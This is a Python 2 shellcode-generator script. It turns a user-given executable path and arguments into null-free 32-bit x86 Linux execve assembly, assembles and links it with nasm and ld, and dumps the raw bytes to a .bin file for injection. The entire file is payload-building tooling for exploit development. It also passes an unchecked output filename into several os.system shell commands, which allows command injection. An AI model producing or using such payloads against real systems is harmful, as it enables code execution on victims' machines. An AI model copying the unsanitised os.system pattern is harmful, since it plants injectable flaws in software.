import os
import sys

print "Input the absolute path to the executable,\nfollowed by standard command-line arguments:\n"
arg_string = raw_input("> ")

global shell
global args
shell = ''
registers = ['ESI', 'EDI', 'EDX', 'ECX']
used_registers = []
args = arg_string.split(' ')

def parseargs(myarg):

   global shell
   myarg = myarg[::-1].encode('hex')
   while myarg:
       if len(myarg) >= 8:
           shell = ''.join((shell,'\tPUSH\t\t0x%s\t\t; %s\n' % (myarg[:8], myarg[:8].decode('hex')) ))
           myarg = myarg[8:]
       elif len(myarg) == 6:
           shell = ''.join((shell,'\tMOV\t\tECX, 0x%s\t\t; %s\n\tSHR\t\tECX, 0x8\n\tPUSH\t\tECX\n' % (''.join((myarg[:6],'ff')), myarg[:6].decode('hex')) ))
           myarg = myarg[6:]
       elif len(myarg) == 4:
           shell = ''.join((shell,'\tMOV\t\tCX, 0x%s\t\t; %s\n\tPUSH\t\tECX\n' % (myarg[:4], myarg[:4].decode('hex'))))
           myarg = myarg[4:]
       elif len(myarg) == 2:
           shell = ''.join((shell,'\tMOV\t\tCL, 0x%s\t\t; %s\n\tPUSH\t\tECX\n' % (myarg[:2], myarg[:2].decode('hex'))))
           myarg = myarg[2:]
          
def make_code():

   global shell
   shell = ''.join((shell, 'GLOBAL _start\nSECTION .TEXT\n\n_start:\n\tXOR\t\tEAX, EAX\n\tPUSH\t\tEAX\n')) # Global prefix and EAX 0'd
   while (len(args[0]) % 4 != 0):
       args[0] = ''.join(('/',args[0]))
   parseargs(args[0])
   shell = ''.join((shell, '\tMOV\t\tEBX, ESP\n\tPUSH\t\tEAX\n'))
   args.pop(0)
  
   while args:
       if(len(args)>len(registers)):
           print "Too many args! Aborting..."
           sys.exit()

       if len(args[0]) % 4 != 0 and len(args[0]) > 4:
           if len(args[0]) % 4 == 3:
               parseargs(args[0][-3:])
               parseargs(args[0][:-3])
           elif len(args[0]) % 2 == 0:
               parseargs(args[0][-2:])
               parseargs(args[0][:-2])
           elif len(args[0]) % 4 == 1:
               parseargs(args[0][-1:])
               parseargs(args[0][:-1])
       elif len(args[0]) <= 4:
           parseargs(args[0])

       shell = ''.join((shell,'\tMOV\t\t%s, ESP\n' % registers[0]))
       used_registers.append(registers[0])
       registers.pop(0)
       args.pop(0)

   while used_registers:
       shell = ''.join((shell, '\tPUSH\t\tEAX\n'))
       shell = ''.join((shell,'\tPUSH\t\t%s\n' % used_registers[0]))
       used_registers.pop(0)  
   shell = ''.join((shell,'\tPUSH\t\tEBX\n\tMOV\t\tECX, ESP\n\tMOV\t\tAL, 0x0B\n\tINT\t\t0x80\n'))

def write_files():
   print '\nAssembly generated. Please enter an output filename.'
   outfile = raw_input('> ')
   os.system('mkdir shellcode_%s' % outfile)
   file = open('shellcode_%s/%s.asm' % (outfile, outfile), 'w')
   file.write(shell)
   file.close()
   os.system('nasm -f elf shellcode_%s/%s.asm -o shellcode_%s/%s.o' % (outfile, outfile, outfile, outfile))
   os.system('ld -m elf_i386 shellcode_%s/%s.o -o shellcode_%s/%s' % (outfile, outfile, outfile, outfile))
   shellcode = open(('shellcode_%s/%s.sh' % (outfile, outfile)), 'w')
   shellcode.write("for i in `objdump -D %s | tr '\\t' ' ' | tr ' ' '\\n' | egrep '^[0-9a-f]{2}$' ` ; do echo -n \"\\x$i\" ; done\n" % outfile)
   shellcode.close()
   os.system('chmod +x shellcode_%s/%s.sh && cd shellcode_%s && ./%s.sh > %s.bin && cd ../' % (outfile, outfile, outfile, outfile, outfile))
   os.system('rm shellcode_%s/%s.sh' % (outfile, outfile))
   os.system('rm shellcode_%s/%s.o' % (outfile, outfile))

make_code()
write_files()
